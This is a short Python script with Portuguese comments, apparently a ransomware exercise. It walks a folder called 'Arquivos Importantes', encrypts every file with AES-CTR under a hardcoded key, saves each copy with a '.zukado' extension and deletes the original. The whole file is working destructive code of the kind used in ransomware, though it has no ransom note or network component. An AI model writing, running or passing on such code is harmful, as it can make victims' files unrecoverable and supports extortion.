import os
import pyaes

# Nome da pasta a ser criptografada
folder_name = "Arquivos Importantes"

# Chave de criptografia (deve ser a mesma para criptografar e descriptografar)
key = b"12345678901234567890123456789012" #

# Inicializa o modo de operação do AES
aes = pyaes.AESModeOfOperationCTR(key) #

print(f"Iniciando a criptografia da pasta: {folder_name}")

# Percorre todos os arquivos e subdiretórios da pasta especificada
for root, dirs, files in os.walk(folder_name):
    for file in files:
        file_path = os.path.join(root, file)

        # 1. Abrir e ler o arquivo original
        # A instrução 'with' garante que o arquivo seja fechado automaticamente
        with open(file_path, "rb") as f: #
            file_data = f.read() #

        # 2. Criptografar os dados do arquivo
        crypted_data = aes.encrypt(file_data) #

        # 3. Salvar o novo arquivo criptografado
        new_file_name = file_path + ".zukado" #
        with open(new_file_name, "wb") as f: #
            f.write(crypted_data) #
        
        print(f"Criptografado: '{file_path}' -> '{new_file_name}'")

        # 4. Remover o arquivo original
        os.remove(file_path) #

print("\nCriptografia concluída com sucesso!")